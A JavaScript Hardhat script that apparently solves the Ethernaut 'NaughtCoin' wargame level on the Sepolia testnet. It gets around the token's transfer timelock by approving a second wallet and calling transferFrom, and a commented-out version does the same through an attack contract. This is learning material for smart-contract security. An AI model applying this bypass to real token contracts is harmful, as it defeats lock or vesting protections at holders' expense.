const {ethers} = require('hardhat');

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const SECOND_PRIVATE_KEY = process.env.SECOND_PRIVATE_KEY;
const ALCHEMY_SEPOLIA_URL = process.env.ALCHEMY_SEPOLIA_URL;

const provider = new ethers.providers.JsonRpcProvider(ALCHEMY_SEPOLIA_URL);
const wallet1 = new ethers.Wallet(PRIVATE_KEY, provider);
const wallet2 = new ethers.Wallet(SECOND_PRIVATE_KEY, provider);

const Instance_Address = '0x4Bf0aeDe868dE0FDc8e2b5a4931259B2B423Db7B';
Instance_Json = require('../artifacts/contracts/15_NaughtCoin.sol/NaughtCoin.json');
const Instance_Abi = Instance_Json.abi;
// const Instance = new ethers.Contract(Instance_Address, Instance_Abi, wallet1);
const Instance = new ethers.Contract(Instance_Address, Instance_Abi);


// const Attack_Address = '0x329650453103f12fB0fC7207bEAc3105d2D4cFDf';
// Attack_Json = require('../artifacts/contracts/15_NaughtCoin.sol/Attack_NaughtCoin.json');
// const Attack_Abi = Attack_Json.abi;
// const Attack = new ethers.Contract(Attack_Address, Attack_Abi, wallet1);


//wallet1_address = 0x8235753B562109C0efD4C2dA4E4138aed10Fa397
//attack_contract_address = 0x6c7FDC2f7F6BE6603cB49ba211FA8cc68da32497
const main = async () => {

    // let owner_balance = await Instance.balanceOf(wallet1.address);
    // console.log("owner_balance: ", owner_balance.toString());
    // await Instance.approve(Attack_Address, owner_balance);
    // let allowance = await Instance.allowance(wallet1.address,Attack_Address);
    // console.log("allowance: ", allowance.toString());
    // let result = await Attack.attack(allowance, Attack_Address);
    // await result.wait(1);
    // // console.log("result: ", result);
    // owner_balance = await Instance.balanceOf(wallet1.address);
    // console.log("owner_balance: ", owner_balance.toString());

    //==================
    let owner_balance = await Instance.connect(wallet1).balanceOf(wallet1.address);
    console.log("owner_balance: ", owner_balance.toString());
    await Instance.connect(wallet1).approve(wallet2.address,owner_balance);

    let allowance = await Instance.connect(wallet1).allowance(wallet1.address,wallet2.address);
    console.log("allowance: ", allowance.toString());
    const tx = await Instance.connect(wallet2).transferFrom(wallet1.address,wallet2.address,allowance);
    await tx.wait(1);
    owner_balance = await Instance.connect(wallet1).balanceOf(wallet1.address);
    console.log("owner_balance: ", owner_balance.toString());



}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });
